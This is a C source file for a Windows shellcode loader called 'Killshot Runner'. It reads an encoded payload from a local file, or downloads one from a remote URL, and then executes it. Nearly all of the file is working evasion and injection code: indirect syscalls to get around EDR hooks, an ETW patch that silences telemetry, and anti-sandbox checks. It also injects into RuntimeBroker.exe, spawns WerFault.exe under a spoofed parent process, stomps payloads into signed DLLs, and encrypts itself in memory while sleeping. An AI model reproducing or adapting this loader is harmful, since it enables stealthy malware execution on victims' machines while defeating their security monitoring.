/*
 * Killshot Runner — C Edition
 * Techniques:
 *   - Hell's Gate + Halo's Gate (indirect syscalls — bypasses EDR userland hooks)
 *   - Sleep XOR obfuscation (defeat MARS time-scan — shellcode encrypted during sleep)
 *   - Module stomping (shellcode placed in .text of loaded signed DLL)
 *   - Stack spoofing (NtCreateThreadEx start = ntdll jmp rcx gadget)
 *   - Named pipe output capture (tool output forwarded to stdout)
 *   - Process injection into RuntimeBroker.exe (shellcode runs in Microsoft-signed process)
 *   - PPID spoofing — spawned processes appear as explorer.exe children
 *   - ETW patch (EtwEventWrite → 0xC3 RET — kills behavioral telemetry)
 *   - Anti-sandbox (uptime, process count via NtQuerySystemInformation)
 *   - No CRT: Win32-only file I/O, heap, inline base64
 *   - No tlhelp32: process enumeration via NtQuerySystemInformation
 *
 * POLY_ identifiers replaced by runner_c_builder.py at build time.
 */

#include <windows.h>
#include <winternl.h>

/* ─── SYSTEM_PROCESS_INFORMATION layout (NtQuerySystemInformation class 5) ─── */
typedef struct {
    ULONG          NextEntryOffset;
    ULONG          NumberOfThreads;
    LARGE_INTEGER  WorkingSetPrivateSize;
    ULONG          HardFaultCount;
    ULONG          NumberOfThreadsHighWatermark;
    ULONGLONG      CycleTime;
    LARGE_INTEGER  CreateTime;
    LARGE_INTEGER  UserTime;
    LARGE_INTEGER  KernelTime;
    UNICODE_STRING ImageName;
    LONG           BasePriority;
    HANDLE         UniqueProcessId;
    HANDLE         InheritedFromUniqueProcessId;
    ULONG          HandleCount;
    ULONG          SessionId;
} KS_SPROC;

/* ─── NT prototypes ─── */
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(HANDLE,PVOID*,PSIZE_T,ULONG,PULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
typedef NTSTATUS (NTAPI *pNtOpenProcess)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PCLIENT_ID);
typedef NTSTATUS (NTAPI *pNtWaitForSingleObject)(HANDLE,BOOLEAN,PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);
typedef NTSTATUS (NTAPI *pNtQuerySystemInformation)(ULONG,PVOID,ULONG,PULONG);

/* ─── WinHTTP function pointer types (dynamic load, no winhttp.h required) ─── */
typedef void*    HINTERNET;
typedef HINTERNET(WINAPI *pWHOpen)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET(WINAPI *pWHConnect)(HINTERNET,LPCWSTR,WORD,DWORD);
typedef HINTERNET(WINAPI *pWHOpenReq)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL     (WINAPI *pWHSend)(HINTERNET,LPCWSTR,DWORD,PVOID,DWORD,DWORD,ULONG_PTR);
typedef BOOL     (WINAPI *pWHRecv)(HINTERNET,PVOID);
typedef BOOL     (WINAPI *pWHQAvail)(HINTERNET,LPDWORD);
typedef BOOL     (WINAPI *pWHRead)(HINTERNET,PVOID,DWORD,LPDWORD);
typedef BOOL     (WINAPI *pWHClose)(HINTERNET);
typedef BOOL     (WINAPI *pWHCrack)(LPCWSTR,DWORD,DWORD,PVOID);

/* ─── Junk padding (compiler keeps these; runners differ structurally per build) ─── */
static int POLY_JUNK1(int x){ return x * POLY_CONST1 + POLY_CONST2; }
static int POLY_JUNK2(int a, int b){ int c = a ^ b; return c + POLY_CONST3; }
static int POLY_JUNK3(void){ int s=0; for(int i=0;i<POLY_CONST4;i++) s+=i; return s; }

/* ─── Globals ─── */
static HMODULE POLY_NTDLL  = NULL;
static PBYTE   POLY_STUBS  = NULL;  /* 8 pre-baked RX stubs — no mutable RWX region */

/* Stub index constants (fixed names — not polymorphic) */
#define KS_SI_ALLOC    0
#define KS_SI_WRITE    1
#define KS_SI_PROT     2
#define KS_SI_THREAD   3
#define KS_SI_OPEN     4
#define KS_SI_WAIT     5
#define KS_SI_CLOSE    6
#define KS_SI_SYSINFO  7
#define KS_STUB(i)     (POLY_STUBS + (i) * 16)

/* ─── CRT-free helpers ─── */
static int ks_streq(const char *a, const char *b) {
    while (*a && *b && *a == *b) { a++; b++; }
    return (int)((unsigned char)*a - (unsigned char)*b);
}
static int ks_wicmp(LPCWSTR a, LPCWSTR b) {
    while (*a && *b) {
        WCHAR ca = (*a>=(WCHAR)'a'&&*a<=(WCHAR)'z') ? *a-(WCHAR)32 : *a;
        WCHAR cb = (*b>=(WCHAR)'a'&&*b<=(WCHAR)'z') ? *b-(WCHAR)32 : *b;
        if (ca != cb) return 1;
        a++; b++;
    }
    return (int)(*a != *b);
}

/* ─── Inline base64 decode (no crypt32.dll) ─── */
static DWORD ks_b64val(BYTE c) {
    if (c>='A'&&c<='Z') return c-'A';
    if (c>='a'&&c<='z') return c-'a'+26;
    if (c>='0'&&c<='9') return c-'0'+52;
    if (c=='+') return 62;
    if (c=='/') return 63;
    return 0xFF;
}
static DWORD ks_b64dec(const BYTE *src, DWORD slen, BYTE *dst) {
    DWORD out = 0; UINT acc = 0; int bits = 0;
    for (DWORD i = 0; i < slen; i++) {
        BYTE ch = src[i];
        if (ch=='='||ch=='\r'||ch=='\n'||ch==' ') continue;
        DWORD v = ks_b64val(ch);
        if (v==0xFF) continue;
        acc=(acc<<6)|v; bits+=6;
        if (bits>=8) { bits-=8; if(dst) dst[out]=(BYTE)(acc>>bits); out++; }
    }
    return out;
}

/* ─── Hell's Gate + Halo's Gate syscall number resolver ─── */
static WORD POLY_GETSSN(LPCSTR name) {
    PBYTE pf = (PBYTE)GetProcAddress(POLY_NTDLL, name);
    if (!pf) return 0;
    /* Standard: 4C 8B D1 B8 XX XX 00 00 */
    if (pf[0]==0x4C && pf[1]==0x8B && pf[2]==0xD1 && pf[3]==0xB8)
        return *(WORD*)(pf+4);
    /* Hooked — Halo's Gate: walk ±8 stubs (stride 32) looking for clean neighbor */
    for (int i = 1; i <= 8; i++) {
        PBYTE up = pf + i*32;
        if (up[0]==0x4C && up[1]==0x8B && up[2]==0xD1 && up[3]==0xB8)
            return *(WORD*)(up+4) - (WORD)i;
        PBYTE dn = pf - i*32;
        if (dn[0]==0x4C && dn[1]==0x8B && dn[2]==0xD1 && dn[3]==0xB8)
            return *(WORD*)(dn+4) + (WORD)i;
    }
    return 0;
}

/* ─── Pre-baked syscall stubs: W^X — allocated RW, written once, flipped to RX ─── */
static BOOL POLY_INITSTUB(void) {
    POLY_NTDLL = GetModuleHandleA("ntdll.dll");

    /* Resolve SSNs — strings obfuscated by builder (non-static: runtime init ok) */
    const char *ks_names[8] = {
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtOpenProcess",
        "NtWaitForSingleObject",
        "NtClose",
        "NtQuerySystemInformation",
    };
    WORD ssns[8] = {0};
    for (int i = 0; i < 8; i++) {
        ssns[i] = POLY_GETSSN(ks_names[i]);
        if (i < 4 && !ssns[i]) return FALSE;   /* first four are mandatory */
    }

    /* Allocate 8 stubs as PAGE_READWRITE — no RWX ever exists */
    POLY_STUBS = (PBYTE)VirtualAlloc(NULL, 8 * 16,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!POLY_STUBS) return FALSE;

    /* Write each stub: mov r10,rcx | mov eax,SSN | syscall | ret */
    static const BYTE stub_tmpl[11] = {
        0x4C,0x8B,0xD1, 0xB8,0x00,0x00,0x00,0x00, 0x0F,0x05, 0xC3
    };
    for (int i = 0; i < 8; i++) {
        PBYTE s = POLY_STUBS + i * 16;
        for (int j = 0; j < 11; j++) s[j] = stub_tmpl[j];
        *(WORD*)(s + 4) = ssns[i];   /* bake SSN — never written again */
    }

    /* Flip entire stub array to PAGE_EXECUTE_READ — no further writes to this region */
    DWORD old;
    VirtualProtect(POLY_STUBS, 8 * 16, PAGE_EXECUTE_READ, &old);
    return TRUE;
}

/* Direct stub dispatch — read-only after init, no per-call writes */
static NTSTATUS POLY_NTALLOC(HANDLE h,PVOID*b,ULONG_PTR z,PSIZE_T s,ULONG t,ULONG p){
    return ((pNtAllocateVirtualMemory)KS_STUB(KS_SI_ALLOC))(h,b,z,s,t,p);
}
static NTSTATUS POLY_NTWRITE(HANDLE h,PVOID b,PVOID d,SIZE_T s,PSIZE_T w){
    return ((pNtWriteVirtualMemory)KS_STUB(KS_SI_WRITE))(h,b,d,s,w);
}
static NTSTATUS POLY_NTPROT(HANDLE h,PVOID*b,PSIZE_T s,ULONG p,PULONG o){
    return ((pNtProtectVirtualMemory)KS_STUB(KS_SI_PROT))(h,b,s,p,o);
}
static NTSTATUS POLY_NTTHREAD(PHANDLE t,ACCESS_MASK a,PVOID oa,HANDLE ph,PVOID sr,PVOID arg,ULONG f,SIZE_T zb,SIZE_T ss,SIZE_T ms,PVOID al){
    return ((pNtCreateThreadEx)KS_STUB(KS_SI_THREAD))(t,a,oa,ph,sr,arg,f,zb,ss,ms,al);
}
static NTSTATUS POLY_NTOPEN(PHANDLE ph,ACCESS_MASK a,POBJECT_ATTRIBUTES oa,PCLIENT_ID cid){
    return ((pNtOpenProcess)KS_STUB(KS_SI_OPEN))(ph,a,oa,cid);
}
static NTSTATUS POLY_NTWAIT(HANDLE h,BOOLEAN al,PLARGE_INTEGER to){
    return ((pNtWaitForSingleObject)KS_STUB(KS_SI_WAIT))(h,al,to);
}
static NTSTATUS POLY_NTCLOSE(HANDLE h){
    return ((pNtClose)KS_STUB(KS_SI_CLOSE))(h);
}

/* ─── ETW patch via indirect syscall (avoids Win32 VirtualProtect hook) ─── */
static void POLY_PATCHETW(void) {
    PBYTE p = (PBYTE)GetProcAddress(POLY_NTDLL, "EtwEventWrite");
    if (!p) return;
    /* Page-align the target for NtProtectVirtualMemory */
    PVOID page = (PVOID)((ULONG_PTR)p & ~(ULONG_PTR)0xFFF);
    SIZE_T sz   = 0x1000;
    ULONG  old  = 0;
    POLY_NTPROT(GetCurrentProcess(), &page, &sz, PAGE_EXECUTE_READWRITE, &old);
    p[0] = 0xC3; p[1] = 0xC3;   /* ret; ret — belt-and-suspenders */
    POLY_NTPROT(GetCurrentProcess(), &page, &sz, old, &old);
}

/* ─── NtQuerySystemInformation buffer — grows until fits ─── */
static PVOID ks_qsys(void) {
    ULONG size = 0x10000;
    for (int t = 0; t < 8; t++) {
        PVOID buf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
        if (!buf) return NULL;
        ULONG ret = 0;
        NTSTATUS st = ((pNtQuerySystemInformation)KS_STUB(KS_SI_SYSINFO))(5, buf, size, &ret);
        if (NT_SUCCESS(st)) return buf;
        HeapFree(GetProcessHeap(), 0, buf);
        if (st != (NTSTATUS)0xC0000004L) return NULL;
        size = ret + 0x1000;
    }
    return NULL;
}

/* ─── Anti-sandbox (uptime + process count) ─── */
static BOOL POLY_SANDBOX(void) {
    if (GetTickCount64() < 300000) return TRUE;
    PVOID buf = ks_qsys();
    if (!buf) return FALSE;
    int cnt = 0;
    KS_SPROC *p = (KS_SPROC*)buf;
    for (;;) {
        cnt++;
        if (!p->NextEntryOffset) break;
        p = (KS_SPROC*)((PBYTE)p + p->NextEntryOffset);
    }
    HeapFree(GetProcessHeap(), 0, buf);
    return cnt < 40;
}

/* ─── Find PID by image name ─── */
static DWORD POLY_FINDPID(LPCWSTR name) {
    PVOID buf = ks_qsys();
    if (!buf) return 0;
    DWORD pid = 0;
    KS_SPROC *p = (KS_SPROC*)buf;
    for (;;) {
        if (p->ImageName.Buffer && (ULONG_PTR)p->UniqueProcessId > 4) {
            if (ks_wicmp(p->ImageName.Buffer, name) == 0) {
                pid = (DWORD)(ULONG_PTR)p->UniqueProcessId;
                break;
            }
        }
        if (!p->NextEntryOffset) break;
        p = (KS_SPROC*)((PBYTE)p + p->NextEntryOffset);
    }
    HeapFree(GetProcessHeap(), 0, buf);
    return pid;
}

/* ─── Remote process injection via indirect syscalls ─── */
static BOOL POLY_INJECT(DWORD pid, PBYTE sc, SIZE_T sclen) {
    CLIENT_ID cid = {0};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
    OBJECT_ATTRIBUTES oa = {sizeof(OBJECT_ATTRIBUTES)};

    HANDLE hProc = NULL;
    if (!NT_SUCCESS(POLY_NTOPEN(&hProc, PROCESS_ALL_ACCESS, &oa, &cid)))
        return FALSE;

    PVOID base = NULL; SIZE_T sz = sclen;
    if (!NT_SUCCESS(POLY_NTALLOC(hProc, &base, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE))) {
        POLY_NTCLOSE(hProc); return FALSE;
    }
    SIZE_T written = 0;
    if (!NT_SUCCESS(POLY_NTWRITE(hProc, base, sc, sclen, &written))) {
        POLY_NTCLOSE(hProc); return FALSE;
    }
    ULONG old;
    if (!NT_SUCCESS(POLY_NTPROT(hProc, &base, &sz, PAGE_EXECUTE_READ, &old))) {
        POLY_NTCLOSE(hProc); return FALSE;
    }
    HANDLE hThread = NULL;
    POLY_NTTHREAD(&hThread, THREAD_ALL_ACCESS, NULL, hProc,
                  base, NULL, 0, 0, 0x200000, 0x200000, NULL);
    if (hThread) POLY_NTCLOSE(hThread);
    POLY_NTCLOSE(hProc);
    return hThread != NULL;
}

/* ─── PPID-spoofed process spawn + injection ─── */
static BOOL POLY_SPAWNinject(PBYTE sc, SIZE_T sclen) {
    DWORD explorerPid = POLY_FINDPID(L"explorer.exe");
    if (!explorerPid) return FALSE;

    HANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, explorerPid);
    if (!hParent) return FALSE;

    SIZE_T attrSz = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attrSz);
    LPPROC_THREAD_ATTRIBUTE_LIST attrList =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSz);
    InitializeProcThreadAttributeList(attrList, 1, 0, &attrSz);
    UpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
        &hParent, sizeof(HANDLE), NULL, NULL);

    STARTUPINFOEXW si = {0};
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    si.lpAttributeList = attrList;

    WCHAR cmd[] = L"C:\\Windows\\System32\\WerFault.exe -p -s";
    PROCESS_INFORMATION pi = {0};
    BOOL spawned = CreateProcessW(NULL, cmd, NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW,
        NULL, NULL, &si.StartupInfo, &pi);

    DeleteProcThreadAttributeList(attrList);
    HeapFree(GetProcessHeap(), 0, attrList);
    CloseHandle(hParent);
    if (!spawned) return FALSE;

    CLIENT_ID cid = {0};
    cid.UniqueProcess = (HANDLE)(ULONG_PTR)pi.dwProcessId;
    OBJECT_ATTRIBUTES oa = {sizeof(OBJECT_ATTRIBUTES)};
    HANDLE hProc = NULL;
    POLY_NTOPEN(&hProc, PROCESS_ALL_ACCESS, &oa, &cid);

    BOOL ok = FALSE;
    if (hProc) {
        PVOID base = NULL; SIZE_T sz = sclen;
        if (NT_SUCCESS(POLY_NTALLOC(hProc, &base, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE))) {
            SIZE_T w = 0;
            POLY_NTWRITE(hProc, base, sc, sclen, &w);
            ULONG old;
            POLY_NTPROT(hProc, &base, &sz, PAGE_EXECUTE_READ, &old);
            HANDLE hThread = NULL;
            POLY_NTTHREAD(&hThread, THREAD_ALL_ACCESS, NULL, hProc,
                          base, NULL, 0, 0, 0x200000, 0x200000, NULL);
            if (hThread) { POLY_NTCLOSE(hThread); ok = TRUE; }
        }
        POLY_NTCLOSE(hProc);
    }
    if (!ok) TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    return ok;
}

/* ─── Stack gadget finder: scan ntdll .text for FF E1 (jmp rcx) ─── */
static PBYTE POLY_FINDGADGET(HMODULE ntdll) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_CNT_CODE)) continue;
        PBYTE base = (PBYTE)ntdll + sec->VirtualAddress;
        SIZE_T sz  = sec->Misc.VirtualSize;
        for (SIZE_T j = 0; j + 1 < sz; j++) {
            if (base[j] == 0xFF && base[j+1] == 0xE1)
                return base + j;
        }
    }
    return NULL;
}

/* ─── Module stomping: write shellcode into .text of a loaded signed DLL ─── */
static PBYTE POLY_MODSTOMP(SIZE_T needed) {
    static const char *candidates[] = {
        "wintrust.dll", "cryptnet.dll", "dpapi.dll",
        "coml2.dll", "wbemcomn.dll", "rasapi32.dll", NULL
    };
    for (int i = 0; candidates[i]; i++) {
        HMODULE hMod = LoadLibraryA(candidates[i]);
        if (!hMod) continue;
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
        PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)hMod + dos->e_lfanew);
        PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
        for (WORD j = 0; j < nt->FileHeader.NumberOfSections; j++, sec++) {
            if (!(sec->Characteristics & IMAGE_SCN_CNT_CODE)) continue;
            PBYTE textBase = (PBYTE)hMod + sec->VirtualAddress;
            SIZE_T textSize = sec->Misc.VirtualSize;
            if (textSize < needed) continue;
            DWORD old;
            if (VirtualProtect(textBase, needed, PAGE_READWRITE, &old))
                return textBase;
        }
        FreeLibrary(hMod);
    }
    return NULL;
}

/* ─── Self-injection: module stomp → XOR sleep → stack spoof → pipe capture ─── */
/* Returns: 0=success, 14=memory alloc fail, 15=thread create fail              */
static int POLY_SELFINJECT(PBYTE sc, SIZE_T sclen) {
    /* Prefer module stomping (.text of signed DLL) over anonymous RX alloc */
    PBYTE exec_base = POLY_MODSTOMP(sclen);
    if (!exec_base) {
        PVOID base = NULL; SIZE_T sz = sclen;
        POLY_NTALLOC(GetCurrentProcess(), &base, 0, &sz,
                     MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
        if (!base) return 14;
        exec_base = (PBYTE)base;
    }

    SIZE_T w = 0;
    POLY_NTWRITE(GetCurrentProcess(), exec_base, sc, sclen, &w);

    /* XOR-encrypt during sleep: in-memory scanner sees garbage */
    BYTE xkey = (BYTE)(GetTickCount() & 0xFE) | 1;
    for (SIZE_T i = 0; i < sclen; i++) exec_base[i] ^= xkey;
    Sleep(2000 + (GetTickCount() % 3000));
    for (SIZE_T i = 0; i < sclen; i++) exec_base[i] ^= xkey;

    DWORD oldProt;
    VirtualProtect(exec_base, sclen, PAGE_EXECUTE_READ, &oldProt);

    /* Stack spoof: start thread at ntdll jmp-rcx gadget, rcx = shellcode base.
     * Shellcode Console.Write flows directly to r.exe stdout (WinRM captures it). */
    PBYTE gadget = POLY_FINDGADGET(POLY_NTDLL);
    PVOID tstart = gadget ? (PVOID)gadget   : (PVOID)exec_base;
    PVOID targ   = gadget ? (PVOID)exec_base : NULL;

    HANDLE hThread = NULL;
    POLY_NTTHREAD(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(),
                  tstart, targ, 0, 0, 0x200000, 0x200000, NULL);
    if (!hThread) return 15;

    POLY_NTWAIT(hThread, FALSE, NULL);
    POLY_NTCLOSE(hThread);
    return 0;
}

/* ─── Load + XOR-decrypt shellcode from .enc file (no crypt32, no stdio) ─── */
/* ─── Decode .enc bytes (base64 → XOR): shared by local and remote load ─── */
static PBYTE ks_decenc(PBYTE raw, DWORD rawlen, SIZE_T *sclen) {
    if (!raw || rawlen < 2) return NULL;
    raw[rawlen] = raw[rawlen+1] = 0;
    DWORD blen = ks_b64dec(raw, rawlen, NULL);
    PBYTE blob = (PBYTE)HeapAlloc(GetProcessHeap(), 0, blen + 1);
    if (!blob) return NULL;
    ks_b64dec(raw, rawlen, blob);
    if (blen < 2) { HeapFree(GetProcessHeap(), 0, blob); return NULL; }
    BYTE key = blob[0];
    DWORD slen = blen - 1;
    PBYTE sc = (PBYTE)HeapAlloc(GetProcessHeap(), 0, slen);
    if (!sc) { HeapFree(GetProcessHeap(), 0, blob); return NULL; }
    for (DWORD i = 0; i < slen; i++) sc[i] = blob[i+1] ^ key;
    HeapFree(GetProcessHeap(), 0, blob);
    *sclen = slen;
    return sc;
}

static PBYTE POLY_LOADENC(LPCSTR path, SIZE_T *sclen) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) return NULL;
    DWORD fsz = GetFileSize(h, NULL);
    if (fsz == INVALID_FILE_SIZE || fsz == 0) { CloseHandle(h); return NULL; }
    PBYTE raw = (PBYTE)HeapAlloc(GetProcessHeap(), 0, fsz + 2);
    if (!raw) { CloseHandle(h); return NULL; }
    DWORD rd = 0;
    ReadFile(h, raw, fsz, &rd, NULL);
    CloseHandle(h);
    PBYTE sc = ks_decenc(raw, fsz, sclen);
    HeapFree(GetProcessHeap(), 0, raw);
    return sc;
}

/* ─── WinHTTP remote fetch: downloads URL to heap buffer ─── */
static PBYTE POLY_HTTPGET(LPCSTR url_a, SIZE_T *sclen) {
    /* Convert ASCII URL to wide */
    int wsz = MultiByteToWideChar(CP_ACP, 0, url_a, -1, NULL, 0);
    if (wsz <= 0) return NULL;
    WCHAR *wurl = (WCHAR*)HeapAlloc(GetProcessHeap(), 0, wsz * sizeof(WCHAR));
    if (!wurl) return NULL;
    MultiByteToWideChar(CP_ACP, 0, url_a, -1, wurl, wsz);

    HMODULE hWH = LoadLibraryA("winhttp.dll");
    if (!hWH) { HeapFree(GetProcessHeap(), 0, wurl); return NULL; }

    pWHOpen    fnOpen  = (pWHOpen)   GetProcAddress(hWH, "WinHttpOpen");
    pWHConnect fnConn  = (pWHConnect)GetProcAddress(hWH, "WinHttpConnect");
    pWHOpenReq fnReq   = (pWHOpenReq)GetProcAddress(hWH, "WinHttpOpenRequest");
    pWHSend    fnSend  = (pWHSend)   GetProcAddress(hWH, "WinHttpSendRequest");
    pWHRecv    fnRecv  = (pWHRecv)   GetProcAddress(hWH, "WinHttpReceiveResponse");
    pWHQAvail  fnAvail = (pWHQAvail) GetProcAddress(hWH, "WinHttpQueryDataAvailable");
    pWHRead    fnRead  = (pWHRead)   GetProcAddress(hWH, "WinHttpReadData");
    pWHClose   fnClose = (pWHClose)  GetProcAddress(hWH, "WinHttpCloseHandle");

    if (!fnOpen||!fnConn||!fnReq||!fnSend||!fnRecv||!fnAvail||!fnRead||!fnClose) {
        FreeLibrary(hWH); HeapFree(GetProcessHeap(), 0, wurl); return NULL;
    }

    /* Parse host:port and path from URL (http://host:port/path) */
    WCHAR host[256]; host[0] = 0; WORD port = 80; WCHAR path[1024]; path[0] = 0;
    WCHAR *p = wurl;
    if (p[0]=='h'&&p[1]=='t'&&p[2]=='t'&&p[3]=='p'&&p[4]==':'&&p[5]=='/'&&p[6]=='/') p += 7;
    WCHAR *slash = p;
    while (*slash && *slash != L'/' && *slash != L':') slash++;
    DWORD hlen = (DWORD)(slash - p);
    if (hlen >= 256) hlen = 255;
    for (DWORD i = 0; i < hlen; i++) host[i] = p[i];
    host[hlen] = 0;
    if (*slash == L':') {
        slash++;
        WORD n = 0;
        while (*slash >= L'0' && *slash <= L'9') { n = (WORD)(n*10 + (*slash++ - L'0')); }
        if (n) port = n;
    }
    if (*slash) {
        DWORD pl = 0;
        while (slash[pl] && pl < 1023) { path[pl] = slash[pl]; pl++; }
        path[pl] = 0;
    } else {
        path[0] = L'/'; path[1] = 0;
    }
    HeapFree(GetProcessHeap(), 0, wurl);

    HINTERNET hSess = fnOpen(L"Mozilla/5.0", 0 /*WINHTTP_ACCESS_TYPE_DEFAULT_PROXY*/, NULL, NULL, 0);
    if (!hSess) { FreeLibrary(hWH); return NULL; }
    HINTERNET hConn = fnConn(hSess, host, port, 0);
    if (!hConn) { fnClose(hSess); FreeLibrary(hWH); return NULL; }
    HINTERNET hReq  = fnReq(hConn, L"GET", path, NULL, NULL, NULL, 0);
    if (!hReq)  { fnClose(hConn); fnClose(hSess); FreeLibrary(hWH); return NULL; }

    if (!fnSend(hReq, NULL, 0, NULL, 0, 0, 0) || !fnRecv(hReq, NULL)) {
        fnClose(hReq); fnClose(hConn); fnClose(hSess); FreeLibrary(hWH); return NULL;
    }

    /* Read response into growing heap buffer */
    PBYTE buf = NULL; DWORD total = 0;
    for (;;) {
        DWORD avail = 0;
        if (!fnAvail(hReq, &avail) || avail == 0) break;
        PBYTE tmp = (PBYTE)HeapAlloc(GetProcessHeap(), 0, total + avail + 2);
        if (!tmp) break;
        if (buf) { for (DWORD i=0;i<total;i++) tmp[i]=buf[i]; HeapFree(GetProcessHeap(),0,buf); }
        buf = tmp;
        DWORD rd = 0;
        if (!fnRead(hReq, buf + total, avail, &rd) || rd == 0) break;
        total += rd;
    }
    fnClose(hReq); fnClose(hConn); fnClose(hSess); FreeLibrary(hWH);

    if (!buf || total == 0) { if (buf) HeapFree(GetProcessHeap(), 0, buf); return NULL; }

    /* Decode the downloaded .enc bytes */
    PBYTE sc = ks_decenc(buf, total, sclen);
    HeapFree(GetProcessHeap(), 0, buf);
    return sc;
}

/* ─── Command-line tokenizer (no CRT required) ─── */
static int ks_parse_cmdline(char **argv, int max_argc) {
    static char cl_copy[2048];
    char *cl = GetCommandLineA();
    DWORD i = 0;
    while (cl[i] && i < 2046) { cl_copy[i] = cl[i]; i++; }
    cl_copy[i] = 0;

    char *p = cl_copy;
    int argc = 0;
    while (*p && argc < max_argc) {
        while (*p == ' ') p++;
        if (!*p) break;
        if (*p == '"') {
            p++;
            argv[argc++] = p;
            while (*p && *p != '"') p++;
            if (*p) *p++ = 0;
        } else {
            argv[argc++] = p;
            while (*p && *p != ' ') p++;
            if (*p) *p++ = 0;
        }
    }
    argv[argc] = NULL;
    return argc;
}

/* ─── Main logic ─── */
static int ks_run(int argc, char *argv[]) {
    volatile int _j = POLY_JUNK1(argc) + POLY_JUNK2(1,2) + POLY_JUNK3();
    (void)_j;

    /* argv[0]=program, argv[1]=-local/-remote, argv[2]=path */
    if (argc < 3 ||
        (ks_streq(argv[1],"-local")  != 0 &&
         ks_streq(argv[1],"-remote") != 0)) {
        return 11;
    }

    if (!POLY_INITSTUB()) return 12;   /* stubs must be ready before any KS_STUB() call */
    POLY_PATCHETW();
    if (POLY_SANDBOX()) return 0;

    SIZE_T sclen = 0;
    PBYTE sc = NULL;

    if (ks_streq(argv[1], "-local") == 0)
        sc = POLY_LOADENC(argv[2], &sclen);
    else if (ks_streq(argv[1], "-remote") == 0)
        sc = POLY_HTTPGET(argv[2], &sclen);

    if (!sc || sclen == 0) return 13;

    /* Injection priority:
     * 1. RuntimeBroker.exe (always running, user-context, Microsoft-signed)
     * 2. WerFault.exe spawned with explorer.exe as parent (PPID spoof)
     * 3. Self-injection with XOR sleep obfuscation (last resort)
     */
    DWORD targetPid = POLY_FINDPID(L"RuntimeBroker.exe");
    if (targetPid && POLY_INJECT(targetPid, sc, sclen))
        goto done;

    if (POLY_SPAWNinject(sc, sclen))
        goto done;

    POLY_SELFINJECT(sc, sclen);

done:
    SecureZeroMemory(sc, sclen);
    HeapFree(GetProcessHeap(), 0, sc);
    return 0;
}

/* ─── CRT-free entry point — eliminates api-ms-win-crt-* import DLLs ─── */
void __attribute__((noreturn)) mainCRTStartup(void) {
    char *argv[16] = {NULL};
    int argc = ks_parse_cmdline(argv, 15);
    ExitProcess((UINT)ks_run(argc, argv));
}
